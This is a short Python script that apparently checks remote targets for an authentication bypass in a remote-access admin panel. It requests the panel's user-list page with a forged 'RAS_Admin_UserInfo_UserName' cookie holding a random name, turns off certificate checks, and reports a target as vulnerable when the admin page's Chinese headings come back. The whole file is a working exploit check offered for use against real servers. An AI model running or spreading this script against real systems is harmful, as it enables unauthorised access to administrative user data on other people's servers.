import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s1=randomLowercase(5)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"Server/CmxUser.php?pgid=UserList"
	headers={'cookie': 'RAS_Admin_UserInfo_UserName='+s1+''}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	response.encoding='utf8'
	if "class=\"nm-heading\">eKey绑定" in response.text and "class=\"nm-heading\">验证类型" in response.text and "class=\"nm-heading\">机器绑定" in response.text and "class=\"nm-heading\">时间限制" in response.text:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
